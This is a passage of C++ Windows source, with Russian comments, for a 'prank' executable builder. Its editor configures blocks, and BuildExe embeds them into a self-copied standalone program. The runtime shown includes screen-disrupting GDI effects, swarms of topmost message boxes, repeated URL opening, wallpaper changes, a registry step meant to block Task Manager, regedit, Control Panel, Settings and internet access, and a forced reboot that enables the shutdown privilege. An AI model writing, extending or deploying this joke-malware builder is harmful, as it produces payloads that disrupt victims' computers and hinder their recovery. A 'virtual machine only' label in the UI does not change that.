        HDC hm=CreateCompatibleDC(hs);
        HBITMAP bm=CreateCompatibleBitmap(hs,16,16);
        HBITMAP ob=(HBITMAP)SelectObject(hm,bm);
        RECT r={0,0,16,16};
        HBRUSH br=CreateSolidBrush(c);FillRect(hm,&r,br);DeleteObject(br);
        // Сохраняем как BMP через простое сохранение невозможно — используем SetSysColors? 
        // Проще: через SystemParametersInfo + WriteFile BMP. Слишком сложно для runtime, используем SetSysColors
        SelectObject(hm,ob);DeleteObject(bm);DeleteDC(hm);ReleaseDC(nullptr,hs);
        // Простое решение — залить цвета в реестр
        // (полноценно надо SaveBitmap в файл — упростим)
    } else if(!b.wpPath.empty()){
        SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,(PVOID)b.wpPath.c_str(),
            SPIF_UPDATEINIFILE|SPIF_SENDCHANGE);
    }
}

void RtShowMsgBoxes(const RtBlock& b){
    const wchar_t* CLS=L"RuntimeErrBox";
    static bool reg=false;
    if(!reg){
        WNDCLASSW wc={};wc.hInstance=g_hInst;wc.lpfnWndProc=RtErrProc;
        wc.lpszClassName=CLS;wc.hCursor=LoadCursor(nullptr,IDC_ARROW);
        RegisterClassW(&wc);reg=true;
    }
    int sw=GetSystemMetrics(SM_CXSCREEN),sh=GetSystemMetrics(SM_CYSCREEN);
    std::vector<HWND> wins;
    for(int i=0;i<b.msgCount&&!g_rtStop.load();++i){
        int w=260,h=100;
        int x=sw/2-w/2,y=sh/2-h/2;
        HWND hw=CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW,CLS,L"",
            WS_POPUP|WS_BORDER,x,y,w,h,nullptr,nullptr,g_hInst,nullptr);
        if(!hw)break;
        SetWindowLongPtrW(hw,GWLP_USERDATA,i);
        ShowWindow(hw,SW_SHOWNOACTIVATE);
        wins.push_back(hw);
        Sleep(b.msgDelay);
    }
    // Траектории
    DWORD start=GetTickCount();
    while(!g_rtStop.load()&&GetTickCount()-start<3000){
        if(b.msgTrajectory==0){ // круг вокруг курсора
            POINT c;GetCursorPos(&c);
            for(size_t i=0;i<wins.size();++i){
                double ang=(double)GetTickCount()*0.002+i*1.2;
                int x=c.x+(int)(cos(ang)*200)-130;
                int y=c.y+(int)(sin(ang)*200)-50;
                SetWindowPos(wins[i],HWND_TOPMOST,x,y,260,100,SWP_NOACTIVATE);
            }
        } else if(b.msgTrajectory==1){ // центр
            Sleep(100);
        } else if(b.msgTrajectory==2){ // вертикально
            for(size_t i=0;i<wins.size();++i){
                int y=(int)(GetTickCount()*0.3+i*130)%(sh-100);
                SetWindowPos(wins[i],HWND_TOPMOST,(int)(i*(sw/wins.size())+50),y,260,100,SWP_NOACTIVATE);
            }
        } else if(b.msgTrajectory==3){ // горизонтально
            for(size_t i=0;i<wins.size();++i){
                int x=(int)(GetTickCount()*0.5+i*130)%(sw-260);
                SetWindowPos(wins[i],HWND_TOPMOST,x,(int)(i*(sh/wins.size())+50),260,100,SWP_NOACTIVATE);
            }
        } else { // случайно
            for(auto w:wins){
                int x=rand()%(sw-260),y=rand()%(sh-100);
                SetWindowPos(w,HWND_TOPMOST,x,y,260,100,SWP_NOACTIVATE);
            }
        }
        Sleep(20);
    }
    for(auto w:wins)if(IsWindow(w))DestroyWindow(w);
}

void RtLink(const RtBlock& b){
    for(int i=0;i<b.linkCount&&!g_rtStop.load();++i){
        ShellExecuteW(nullptr,L"open",b.linkURL.c_str(),nullptr,nullptr,SW_SHOW);
        Sleep(b.linkDelay);
    }
}

void RtReboot(const RtBlock& b){
    Sleep(b.rebootDelay*1000);
    HANDLE t;TOKEN_PRIVILEGES tp;
    if(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&t)){
        LookupPrivilegeValueW(nullptr,SE_SHUTDOWN_NAME,&tp.Privileges[0].Luid);
        tp.PrivilegeCount=1;tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(t,FALSE,&tp,0,nullptr,nullptr);CloseHandle(t);
    }
    ExitWindowsEx(EWX_REBOOT|EWX_FORCE,SHTDN_REASON_MAJOR_APPLICATION);
}

int RunAsRuntime(){
    HRSRC hRes=FindResourceW(nullptr,L"PRANK_CONFIG",RT_RCDATA);
    if(!hRes)return 1;
    HGLOBAL hG=LoadResource(nullptr,hRes);
    if(!hG)return 1;
    void* data=LockResource(hG);
    DWORD sz=SizeofResource(nullptr,hRes);
    std::string json((char*)data,sz);
    std::vector<RtBlock> blocks=ParseRtJson(json);

    // Setup: блокировка клавиатуры во время выполнения
    // (для простоты — не блокируем, чтобы пользователь мог выйти)
    
    std::thread tAudio;
    
    for(auto& b:blocks){
        if(g_rtStop.load())break;
        switch(b.type){
            case BT_WELCOME: RtShowWelcome(b); break;
            case BT_GDI:
                RtEffect(b.gdiEffect,b.gdiIntensity,b.gdiDuration*1000);
                break;
            case BT_BYTEBEAT:
                g_rtAudioStop=false;g_rtVolume=b.bbVolume;
                if(tAudio.joinable())tAudio.join();
                tAudio=std::thread(RtAudioThread,b.bbTrack,0);
                break;
            case BT_MSGBOX: RtShowMsgBoxes(b); break;
            case BT_LINK: RtLink(b); break;
            case BT_WALLPAPER: RtWallpaper(b); break;
            case BT_REGISTRY: RtSetupIFEO(b); break;
            case BT_REBOOT: RtReboot(b); return 0;
        }
    }
    g_rtAudioStop=true;g_rtStop=true;
    if(tAudio.joinable())tAudio.join();
    return 0;
}

// ============================================================
// BUILD EXE — копирует себя + встраивает JSON
// ============================================================
bool BuildExe(const std::wstring& outPath,const std::string& json){
    wchar_t myPath[MAX_PATH];
    GetModuleFileNameW(nullptr,myPath,MAX_PATH);
    // Копируем себя
    if(!CopyFileW(myPath,outPath.c_str(),FALSE))return false;
    // Открываем для редактирования ресурсов
    HANDLE hU=BeginUpdateResourceW(outPath.c_str(),FALSE);
    if(!hU){DeleteFileW(outPath.c_str());return false;}
    // Добавляем JSON
    if(!UpdateResourceW(hU,RT_RCDATA,L"PRANK_CONFIG",
        MAKELANGID(LANG_NEUTRAL,SUBLANG_NEUTRAL),
        (LPVOID)json.c_str(),(DWORD)json.size())){
        EndUpdateResourceW(hU,TRUE);DeleteFileW(outPath.c_str());return false;
    }
    if(!EndUpdateResourceW(hU,FALSE)){DeleteFileW(outPath.c_str());return false;}
    return true;
}

std::string SerializeProjectToJson(){
    std::string j="{\n  \"name\": \""+EscapeJson(WideToUtf8(g_editor.projectName))+"\",\n  \"blocks\": [\n";
    for(size_t i=0;i<g_editor.blocks.size();++i){
        Block& b=g_editor.blocks[i];
        j+="    {";
        j+="\"id\":"+std::to_string(b.id)+",";
        j+="\"type\":"+std::to_string((int)b.type)+",";
        j+="\"welcomeText\":\""+EscapeJson(WideToUtf8(b.welcomeText))+"\",";
        j+="\"gdiEffect\":"+std::to_string(b.gdiEffect)+",";
        j+="\"gdiDuration\":"+std::to_string(b.gdiDuration)+",";
        j+="\"gdiIntensity\":"+std::to_string(b.gdiIntensity)+",";
        j+="\"bbTrack\":"+std::to_string(b.bbTrack)+",";
        j+="\"bbVolume\":"+std::to_string(b.bbVolume)+",";
        j+="\"msgText\":\""+EscapeJson(WideToUtf8(b.msgText))+"\",";
        j+="\"msgIcon\":"+std::to_string(b.msgIcon)+",";
        j+="\"msgCount\":"+std::to_string(b.msgCount)+",";
        j+="\"msgTrajectory\":"+std::to_string(b.msgTrajectory)+",";
        j+="\"msgDelay\":"+std::to_string(b.msgDelay)+",";
        j+="\"linkURL\":\""+EscapeJson(WideToUtf8(b.linkURL))+"\",";
        j+="\"linkCount\":"+std::to_string(b.linkCount)+",";
        j+="\"linkDelay\":"+std::to_string(b.linkDelay)+",";
        j+="\"wpType\":"+std::to_string(b.wpType)+",";
        j+="\"wpColor\":"+std::to_string(b.wpColor)+",";
        j+="\"wpPath\":\""+EscapeJson(WideToUtf8(b.wpPath))+"\",";
        j+="\"regTaskMgr\":"+std::to_string(b.regTaskMgr?1:0)+",";
        j+="\"regRegedit\":"+std::to_string(b.regRegedit?1:0)+",";
        j+="\"regControlPanel\":"+std::to_string(b.regControlPanel?1:0)+",";
        j+="\"regSettings\":"+std::to_string(b.regSettings?1:0)+",";
        j+="\"regInternet\":"+std::to_string(b.regInternet?1:0)+",";
        j+="\"regWarn\":"+std::to_string(b.regWarn?1:0)+",";
        j+="\"rebootDelay\":"+std::to_string(b.rebootDelay);
        j+="}";
        if(i+1<g_editor.blocks.size())j+=",";
        j+="\n";
    }
    j+="  ]\n}\n";
    return j;
}

// ============================================================
// UI-ПАНЕЛИ
// ============================================================
const int SIDEBAR_W=260,PROPS_W=320,TOPBAR_H=45,BOTTOM_H=60;
int GetCanvasLeft(){return SIDEBAR_W;}
int GetCanvasRight(HWND h){RECT rc;GetClientRect(h,&rc);return rc.right-PROPS_W;}
int GetCanvasTop(){return TOPBAR_H;}
int GetCanvasBottom(HWND h){RECT rc;GetClientRect(h,&rc);return rc.bottom-BOTTOM_H;}

POINT CanvasToScreen(int cx,int cy){return {(int)((cx-g_editor.scrollX)*g_editor.zoom),(int)((cy-g_editor.scrollY)*g_editor.zoom)};}
POINT ScreenToCanvas(int sx,int sy){return {(int)(sx/g_editor.zoom)+g_editor.scrollX,(int)(sy/g_editor.zoom)+g_editor.scrollY};}
Block* FindBlockAtScreen(int sx,int sy){
    for(auto it=g_editor.blocks.rbegin();it!=g_editor.blocks.rend();++it){
        POINT tl=CanvasToScreen(it->x,it->y);
        int w=(int)(it->w*g_editor.zoom),h=(int)(it->h*g_editor.zoom);
        if(sx>=tl.x&&sx<=tl.x+w&&sy>=tl.y&&sy<=tl.y+h)return &(*it);
    }
    return nullptr;
}
Block* FindBlockById(int id){for(auto& b:g_editor.blocks)if(b.id==id)return &b;return nullptr;}

void DrawBlock(HDC dc,const Block& b){
    POINT tl=CanvasToScreen(b.x,b.y);
    int sw=(int)(b.w*g_editor.zoom),sh=(int)(b.h*g_editor.zoom);
    RECT rc={tl.x,tl.y,tl.x+sw,tl.y+sh};
    COLORREF cc=g_categories[b.type].color;
    FillRectC(dc,rc,b.selected?Colors::BG_HOVER:Colors::BG_PANEL);
    RECT cb={tl.x,tl.y,tl.x+6,tl.y+sh};FillRectC(dc,cb,cc);
    HBRUSH br=CreateSolidBrush(b.selected?Colors::ACCENT:Colors::BORDER);
    FrameRect(dc,&rc,br);DeleteObject(br);
    RECT ir={tl.x+15,tl.y+5,tl.x+50,tl.y+sh-5};
    DrawTextCentered(dc,g_categories[b.type].icon,ir,Colors::TEXT,22,false);
    RECT nr={tl.x+55,tl.y+5,tl.x+sw-10,tl.y+35};
    DrawTextLeft(dc,b.title.c_str(),nr,Colors::TEXT,14,true);
    std::wstring sub=g_categories[b.type].ruName;wchar_t buf[128];
    if(b.type==BT_GDI){swprintf_s(buf,L"%s · %dс · %d%%",g_gdiEffects[b.gdiEffect].ruName,b.gdiDuration,b.gdiIntensity);sub=buf;}
    else if(b.type==BT_BYTEBEAT){swprintf_s(buf,L"%s · %d%%",g_byteTracks[b.bbTrack].name,b.bbVolume);sub=buf;}
    else if(b.type==BT_MSGBOX){swprintf_s(buf,L"%s · x%d",b.msgText.c_str(),b.msgCount);sub=buf;}
    else if(b.type==BT_LINK){swprintf_s(buf,L"%s · x%d",b.linkURL.c_str(),b.linkCount);sub=buf;}
    else if(b.type==BT_WALLPAPER){sub=(b.wpType==0)?g_wpColors[b.wpColor].name:L"PNG";}
    else if(b.type==BT_REGISTRY){int c=(b.regTaskMgr?1:0)+(b.regRegedit?1:0)+(b.regControlPanel?1:0)+(b.regSettings?1:0)+(b.regInternet?1:0);
        swprintf_s(buf,L"Активно: %d/5",c);sub=buf;}
    else if(b.type==BT_REBOOT){swprintf_s(buf,L"Задержка: %dс",b.rebootDelay);sub=buf;}
    RECT tr={tl.x+55,tl.y+35,tl.x+sw-10,tl.y+sh-5};
    DrawTextLeft(dc,sub.c_str(),tr,Colors::TEXT_DIM,11,false);
    POINT ip=CanvasToScreen(b.x,b.y+b.h/2),op=CanvasToScreen(b.x+b.w,b.y+b.h/2);
    HBRUSH pb=CreateSolidBrush(cc);int pr=(int)(5*g_editor.zoom);if(pr<3)pr=3;
    HBRUSH ob=(HBRUSH)SelectObject(dc,pb);HPEN op2=(HPEN)SelectObject(dc,GetStockObject(NULL_PEN));
    Ellipse(dc,ip.x-pr,ip.y-pr,ip.x+pr,ip.y+pr);
    Ellipse(dc,op.x-pr,op.y-pr,op.x+pr,op.y+pr);
    SelectObject(dc,ob);SelectObject(dc,op2);DeleteObject(pb);
}

void DrawConnections(HDC dc){
    int n=(int)g_editor.blocks.size();
    HPEN lp=CreatePen(PS_SOLID,2,Colors::LINK);HPEN op=(HPEN)SelectObject(dc,lp);
    for(int i=0;i<n;++i)for(int j=0;j<n;++j){
        if(i==j)continue;
        Block& a=g_editor.blocks[i];Block& b=g_editor.blocks[j];
        int dx=b.x-(a.x+a.w),dy=abs((b.y+b.h/2)-(a.y+a.h/2));
        if(dx>-50&&dx<250&&dy<200){
            bool bl=false;
            for(int k=0;k<n;++k){
                if(k==i||k==j)continue;
                Block& c=g_editor.blocks[k];
                if(c.x+c.w/2>a.x+a.w&&c.x+c.w/2<b.x&&abs(c.y+c.h/2-(a.y+a.h/2))<60){bl=true;break;}
            }
            if(bl)continue;
            POINT p1=CanvasToScreen(a.x+a.w,a.y+a.h/2),p2=CanvasToScreen(b.x,b.y+b.h/2);
            POINT c1={p1.x+50,p1.y},c2={p2.x-50,p2.y};
            POINT pts[4]={p1,c1,c2,p2};PolyBezier(dc,pts,4);
        }
    }
    SelectObject(dc,op);DeleteObject(lp);
}

void DrawGrid(HDC dc,const RECT& rc){
    int gs=(int)(50*g_editor.zoom);if(gs<10)gs=10;
    int sx=-(int)(g_editor.scrollX*g_editor.zoom)%gs,sy=-(int)(g_editor.scrollY*g_editor.zoom)%gs;
    if(sx>0)sx-=gs;if(sy>0)sy-=gs;
    HPEN p=CreatePen(PS_SOLID,1,Colors::GRID);HPEN o=(HPEN)SelectObject(dc,p);
    for(int x=sx;x<rc.right;x+=gs){MoveToEx(dc,x,0,nullptr);LineTo(dc,x,rc.bottom);}
    for(int y=sy;y<rc.bottom;y+=gs){MoveToEx(dc,0,y,nullptr);LineTo(dc,rc.right,y);}
    SelectObject(dc,o);DeleteObject(p);
}

int DrawPalette(HDC dc,int top,int left,int right){
    int y=top+10;const int iH=36;
    for(int i=0;i<BT_COUNT;++i){
        RECT ir={left+5,y,right-5,y+iH};
        bool hv=(i==g_editor.hoveredCategory),ex=(i==g_editor.expandedCategory);
        FillRectC(dc,ir,(hv||ex)?Colors::BG_HOVER:Colors::BG_PANEL);
        RECT cb={ir.left,ir.top,ir.left+4,ir.bottom};FillRectC(dc,cb,g_categories[i].color);
        RECT icr={ir.left+10,ir.top,ir.left+40,ir.bottom};
        DrawTextCentered(dc,g_categories[i].icon,icr,Colors::TEXT,16,false);
        const wchar_t* nm=(g_language==0)?g_categories[i].ruName:g_categories[i].enName;
        RECT nr={ir.left+45,ir.top,ir.right-30,ir.bottom};
        DrawTextLeft(dc,nm,nr,Colors::TEXT,13,true);
        RECT ar={ir.right-30,ir.top,ir.right-10,ir.bottom};
        DrawTextCentered(dc,ex?L"▼":L"▶",ar,Colors::TEXT_DIM,10,false);
        y+=iH+4;
        if(ex){
            RECT hr={left+15,y,right-10,y+30};FillRectC(dc,hr,Colors::BG);
            DrawTextLeft(dc,(g_language==0)?L"Клик — добавить":L"Click to add",hr,Colors::TEXT_DIM,11,false);
            y+=36;
        }
    }
    return y;
}

// ============================================================
// СВОЙСТВА
// ============================================================
void DrawProperties(HDC dc,HWND h){
    RECT rc;GetClientRect(h,&rc);
    int left=rc.right-PROPS_W;
    FillRectC(dc,{left,TOPBAR_H,rc.right,rc.bottom-BOTTOM_H},Colors::BG_DARK);
    g_editor.sliderCount=0;g_editor.buttonCount=0;g_editor.checkboxCount=0;g_editor.swatchCount=0;
    RECT tr={left+15,TOPBAR_H+15,rc.right-15,TOPBAR_H+50};
    DrawTextLeft(dc,(g_language==0)?L"Свойства":L"Properties",tr,Colors::TEXT,16,true);
    if(g_editor.selectedId<0){
        RECT er={left+15,TOPBAR_H+70,rc.right-15,TOPBAR_H+200};
        DrawTextCentered(dc,L"Выбери блок",er,Colors::TEXT_DIM,13,false);
        return;
    }
    Block* b=FindBlockById(g_editor.selectedId);
    if(!b)return;
    int y=TOPBAR_H+70;
    int iL=left+15,iR=rc.right-15;
    RECT ln={iL,y,iR,y+20};DrawTextLeft(dc,(g_language==0)?L"Название:":L"Name:",ln,Colors::TEXT_DIM,11,false);y+=22;
    RECT vn={iL,y,iR,y+26};FillRectC(dc,vn,Colors::BG_PANEL);DrawTextLeft(dc,b->title.c_str(),vn,Colors::TEXT,13,false);y+=34;
    RECT lt={iL,y,iR,y+20};DrawTextLeft(dc,(g_language==0)?L"Тип:":L"Type:",lt,Colors::TEXT_DIM,11,false);y+=22;
    RECT vt={iL,y,iR,y+26};FillRectC(dc,vt,Colors::BG_PANEL);
    DrawTextLeft(dc,(g_language==0)?g_categories[b->type].ruName:g_categories[b->type].enName,vt,Colors::TEXT,13,false);y+=34;
    g_editor.editRect={0,0,0,0};g_editor.editField=0;g_editor.editBlockId=-1;

    if(b->type==BT_WELCOME){
        RECT l={iL,y,iR,y+20};DrawTextLeft(dc,L"Текст:",l,Colors::TEXT_DIM,11,false);y+=22;
        g_editor.editRect={iL,y,iR,y+50};g_editor.editField=1;g_editor.editBlockId=b->id;y+=60;
    } else if(b->type==BT_GDI){
        RECT l={iL,y,iR,y+20};DrawTextLeft(dc,L"Эффект:",l,Colors::TEXT_DIM,11,false);y+=22;
        RECT eb={iL,y,iR,y+30};g_editor.buttonRects[g_editor.buttonCount++]=eb;
        DrawCustomButton(dc,eb,g_gdiEffects[b->gdiEffect].ruName,false,false);y+=38;
        std::wstring st=L"Сложность: ";for(int i=0;i<g_gdiEffects[b->gdiEffect].complexity;++i)st+=L"★";
        RECT sr={iL,y,iR,y+18};DrawTextLeft(dc,st.c_str(),sr,RGB(255,200,80),11,false);y+=26;
        RECT li={iL,y,iR-60,y+20};DrawTextLeft(dc,L"Интенсивность:",li,Colors::TEXT_DIM,11,false);
        wchar_t v1[16];swprintf_s(v1,L"%d%%",b->gdiIntensity);
        RECT vi={iR-55,y,iR,y+20};DrawTextLeft(dc,v1,vi,Colors::TEXT,12,true);y+=22;
        RECT s1={iL,y,iR,y+26};g_editor.sliderRects[g_editor.sliderCount++]=s1;
        DrawSlider(dc,s1,b->gdiIntensity,100,false);y+=36;
        RECT ld={iL,y,iR-80,y+20};DrawTextLeft(dc,L"Длительность:",ld,Colors::TEXT_DIM,11,false);
        wchar_t v2[16];swprintf_s(v2,L"%dс",b->gdiDuration);
        RECT vd={iR-55,y,iR,y+20};DrawTextLeft(dc,v2,vd,Colors::TEXT,12,true);y+=22;
        RECT s2={iL,y,iR,y+26};g_editor.sliderRects[g_editor.sliderCount++]=s2;
        DrawSlider(dc,s2,b->gdiDuration,60,false);y+=36;
    } else if(b->type==BT_BYTEBEAT){
        RECT l={iL,y,iR,y+20};DrawTextLeft(dc,L"Трек:",l,Colors::TEXT_DIM,11,false);y+=22;
        RECT tb={iL,y,iR,y+30};g_editor.buttonRects[g_editor.buttonCount++]=tb;
        DrawCustomButton(dc,tb,g_byteTracks[b->bbTrack].name,false,false);y+=38;
        RECT lv={iL,y,iR-60,y+20};DrawTextLeft(dc,L"Громкость:",lv,Colors::TEXT_DIM,11,false);
        wchar_t v1[16];swprintf_s(v1,L"%d%%",b->bbVolume);
        RECT vv={iR-55,y,iR,y+20};DrawTextLeft(dc,v1,vv,Colors::TEXT,12,true);y+=22;
        RECT sv={iL,y,iR,y+26};g_editor.sliderRects[g_editor.sliderCount++]=sv;
        DrawSlider(dc,sv,b->bbVolume,100,false);y+=36;
    } else if(b->type==BT_MSGBOX){
        RECT l1={iL,y,iR,y+20};DrawTextLeft(dc,L"Текст:",l1,Colors::TEXT_DIM,11,false);y+=22;
        g_editor.editRect={iL,y,iR,y+40};g_editor.editField=2;g_editor.editBlockId=b->id;y+=48;
        RECT l2={iL,y,iR,y+20};DrawTextLeft(dc,L"Иконка:",l2,Colors::TEXT_DIM,11,false);y+=22;
        const wchar_t* ic[]={L"Info",L"Warning",L"Error",L"Question"};
        RECT ib={iL,y,iR,y+28};g_editor.buttonRects[g_editor.buttonCount++]=ib;
        DrawCustomButton(dc,ib,ic[b->msgIcon],false,false);y+=36;
        RECT l3={iL,y,iR-60,y+20};DrawTextLeft(dc,L"Количество:",l3,Colors::TEXT_DIM,11,false);
        wchar_t b1[16];swprintf_s(b1,L"x%d",b->msgCount);
        RECT v3={iR-55,y,iR,y+20};DrawTextLeft(dc,b1,v3,Colors::TEXT,12,true);y+=22;
        RECT s3={iL,y,iR,y+26};g_editor.sliderRects[g_editor.sliderCount++]=s3;
        DrawSlider(dc,s3,b->msgCount,30,false);y+=36;
        RECT l4={iL,y,iR,y+20};DrawTextLeft(dc,L"Траектория:",l4,Colors::TEXT_DIM,11,false);y+=22;
        const wchar_t* tj[]={L"Круг вокруг курсора",L"Центр",L"Вертикально",L"Горизонтально",L"Случайно"};
        RECT tb={iL,y,iR,y+28};g_editor.buttonRects[g_editor.buttonCount++]=tb;
        DrawCustomButton(dc,tb,tj[b->msgTrajectory],false,false);y+=36;
        RECT l5={iL,y,iR-60,y+20};DrawTextLeft(dc,L"Задержка (мс):",l5,Colors::TEXT_DIM,11,false);
        wchar_t b5[16];swprintf_s(b5,L"%d",b->msgDelay);
        RECT v5={iR-60,y,iR,y+20};DrawTextLeft(dc,b5,v5,Colors::TEXT,12,true);y+=22;
        RECT s5={iL,y,iR,y+26};g_editor.sliderRects[g_editor.sliderCount++]=s5;
        DrawSlider(dc,s5,b->msgDelay,3000,false);y+=36;
    } else if(b->type==BT_LINK){
        RECT l1={iL,y,iR,y+20};DrawTextLeft(dc,L"URL:",l1,Colors::TEXT_DIM,11,false);y+=22;
        g_editor.editRect={iL,y,iR,y+32};g_editor.editField=3;g_editor.editBlockId=b->id;y+=40;
        RECT l2={iL,y,iR-60,y+20};DrawTextLeft(dc,L"Раз:",l2,Colors::TEXT_DIM,11,false);
        wchar_t b1[16];swprintf_s(b1,L"x%d",b->linkCount);
        RECT v2={iR-55,y,iR,y+20};DrawTextLeft(dc,b1,v2,Colors::TEXT,12,true);y+=22;
        RECT s2={iL,y,iR,y+26};g_editor.sliderRects[g_editor.sliderCount++]=s2;
        DrawSlider(dc,s2,b->linkCount,10,false);y+=36;
        RECT l3={iL,y,iR-80,y+20};DrawTextLeft(dc,L"Задержка (мс):",l3,Colors::TEXT_DIM,11,false);
        wchar_t b3[16];swprintf_s(b3,L"%d",b->linkDelay);
        RECT v3={iR-60,y,iR,y+20};DrawTextLeft(dc,b3,v3,Colors::TEXT,12,true);y+=22;
        RECT s3={iL,y,iR,y+26};g_editor.sliderRects[g_editor.sliderCount++]=s3;
        DrawSlider(dc,s3,b->linkDelay,5000,false);y+=36;
    } else if(b->type==BT_WALLPAPER){
        RECT l1={iL,y,iR,y+20};DrawTextLeft(dc,L"Тип:",l1,Colors::TEXT_DIM,11,false);y+=22;
        RECT tb={iL,y,iR,y+28};g_editor.buttonRects[g_editor.buttonCount++]=tb;
        DrawCustomButton(dc,tb,b->wpType==0?L"Цвет":L"PNG файл",false,false);y+=36;
        if(b->wpType==0){
            RECT l2={iL,y,iR,y+20};DrawTextLeft(dc,L"Палитра:",l2,Colors::TEXT_DIM,11,false);y+=22;
            int pw=36;
            for(int i=0;i<kWpCount;++i){
                int r=i/6,c=i%6;
                int cx=iL+c*(pw+6),cy=y+r*(pw+6);
                RECT sw={cx,cy,cx+pw,cy+pw};
                g_editor.swatchRects[g_editor.swatchCount++]=sw;
                FillRectC(dc,sw,g_wpColors[i].color);
                if(b->wpColor==i){
                    HBRUSH rg=CreateSolidBrush(Colors::ACCENT);
                    RECT out={sw.left-2,sw.top-2,sw.right+2,sw.bottom+2};
                    FrameRect(dc,&out,rg);DeleteObject(rg);
                }
            }
            y+=2*(pw+6)+10;
        } else {
            RECT l2={iL,y,iR,y+20};DrawTextLeft(dc,L"Путь к PNG:",l2,Colors::TEXT_DIM,11,false);y+=22;
            g_editor.editRect={iL,y,iR,y+32};g_editor.editField=4;g_editor.editBlockId=b->id;y+=40;
            RECT bb={iL,y,iR,y+28};g_editor.buttonRects[g_editor.buttonCount++]=bb;
            DrawCustomButton(dc,bb,L"📂 Выбрать PNG",false,false);y+=36;
        }
    } else if(b->type==BT_REGISTRY){
        RECT wr={iL,y,iR,y+50};FillRectC(dc,wr,RGB(60,40,20));
        HBRUSH wb=CreateSolidBrush(Colors::WARN);FrameRect(dc,&wr,wb);DeleteObject(wb);
        RECT w1=wr;w1.left+=8;DrawTextLeft(dc,L"⚠ Изменит реестр Windows.",w1,Colors::WARN,11,true);
        RECT w2=wr;w2.left+=8;w2.top+=20;DrawTextLeft(dc,L"Только для виртуалки!",w2,Colors::WARN,11,false);
        y+=60;
        RECT l1={iL,y,iR,y+20};DrawTextLeft(dc,L"Блокировки:",l1,Colors::TEXT_DIM,11,false);y+=22;
        struct{const wchar_t* l;bool* p;}it[]={
            {L"Диспетчер задач",&b->regTaskMgr},{L"Реестр",&b->regRegedit},
            {L"Панель управления",&b->regControlPanel},{L"Параметры",&b->regSettings},
            {L"Интернет",&b->regInternet}
        };
        for(int i=0;i<5;++i){
            RECT cb={iL,y,iR,y+26};g_editor.checkboxRects[g_editor.checkboxCount++]=cb;
            DrawCheckbox(dc,cb,*it[i].p,false);
            RECT lr=cb;lr.left+=28;DrawTextLeft(dc,it[i].l,lr,Colors::TEXT,12,false);y+=30;
        }
        y+=6;
        RECT cbW={iL,y,iR,y+26};g_editor.checkboxRects[g_editor.checkboxCount++]=cbW;
        DrawCheckbox(dc,cbW,b->regWarn,false);
        RECT lrW=cbW;lrW.left+=28;DrawTextLeft(dc,L"Предупреждение",lrW,Colors::TEXT,12,false);
    } else if(b->type==BT_REBOOT){
        RECT l1={iL,y,iR-80,y+20};DrawTextLeft(dc,L"Задержка (с):",l1,Colors::TEXT_DIM,11,false);
        wchar_t b1[16];swprintf_s(b1,L"%d",b->rebootDelay);
        RECT v1={iR-55,y,iR,y+20};DrawTextLeft(dc,b1,v1,Colors::TEXT,12,true);y+=22;
        RECT s1={iL,y,iR,y+26};g_editor.sliderRects[g_editor.sliderCount++]=s1;
        DrawSlider(dc,s1,b->rebootDelay,30,false);
    }
}

// ============================================================
// SYNC EDIT
// ============================================================
void SyncPropEdit(HWND h){
    if(!g_editor.propEdit)return;
    if(g_editor.editField==0||g_editor.editBlockId<0){
        if(IsWindowVisible(g_editor.propEdit))ShowWindow(g_editor.propEdit,SW_HIDE);
        return;
    }
    Block* b=FindBlockById(g_editor.editBlockId);
    if(!b){ShowWindow(g_editor.propEdit,SW_HIDE);return;}
    SetWindowPos(g_editor.propEdit,HWND_TOP,g_editor.editRect.left,g_editor.editRect.top,
        g_editor.editRect.right-g_editor.editRect.left,g_editor.editRect.bottom-g_editor.editRect.top,SWP_NOACTIVATE);
    wchar_t cur[2048]={};GetWindowTextW(g_editor.propEdit,cur,2048);
    std::wstring want;
    switch(g_editor.editField){
        case 1:want=b->welcomeText;break;
        case 2:want=b->msgText;break;
        case 3:want=b->linkURL;break;
        case 4:want=b->wpPath;break;
    }
    if(want!=cur)SetWindowTextW(g_editor.propEdit,want.c_str());
    if(!IsWindowVisible(g_editor.propEdit))ShowWindow(g_editor.propEdit,SW_SHOW);
}

// ============================================================
// EFFECT SELECTOR
// ============================================================
LRESULT CALLBACK EffectSelProc(HWND h,UINT m,WPARAM w,LPARAM l){
    static int hO=0,hC=0;
    switch(m){
    case WM_PAINT:{
        PAINTSTRUCT ps;HDC dc=BeginPaint(h,&ps);
        RECT rc;GetClientRect(h,&rc);FillRectC(dc,rc,Colors::BG);
        RECT tr={20,15,rc.right-20,50};
        DrawTextLeft(dc,L"Выбор GDI эффекта",tr,Colors::TEXT,18,true);
        RECT lr={20,60,rc.right-20,rc.bottom-70};FillRectC(dc,lr,Colors::BG_PANEL);
        HRGN rg=CreateRectRgn(lr.left,lr.top,lr.right,lr.bottom);SelectClipRgn(dc,rg);
        int iH=44,stY=lr.top-g_effectSel.scrollY;
        for(int i=0;i<kGdiCount;++i){
            RECT ir={lr.left,stY+i*iH,lr.right,stY+(i+1)*iH-4};
            if(ir.bottom<lr.top||ir.top>lr.bottom)continue;
            bool hv=(i==g_effectSel.hovered),sl=(i==g_effectSel.selected);
            FillRectC(dc,ir,sl?Colors::ACCENT:(hv?Colors::BG_HOVER:Colors::BG_PANEL));
            RECT nr={ir.left+15,ir.top,ir.right-100,ir.bottom};
            DrawTextLeft(dc,g_gdiEffects[i].ruName,nr,Colors::TEXT,14,true);
            std::wstring st;for(int j=0;j<g_gdiEffects[i].complexity;++j)st+=L"★";
            RECT sr={ir.right-90,ir.top,ir.right-10,ir.bottom};
            DrawTextLeft(dc,st.c_str(),sr,RGB(255,200,80),14,false);
        }
        SelectClipRgn(dc,nullptr);DeleteObject(rg);
        RECT cb={rc.right-240,rc.bottom-55,rc.right-140,rc.bottom-15};
        RECT ob={rc.right-130,rc.bottom-55,rc.right-20,rc.bottom-15};
        DrawCustomButton(dc,cb,L"Отмена",hC,false);
        DrawCustomButton(dc,ob,L"OK",hO,true);
        EndPaint(h,&ps);return 0;
    }
    case WM_MOUSEMOVE:{
        int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT lr={20,60,rc.right-20,rc.bottom-70};
        RECT cb={rc.right-240,rc.bottom-55,rc.right-140,rc.bottom-15};
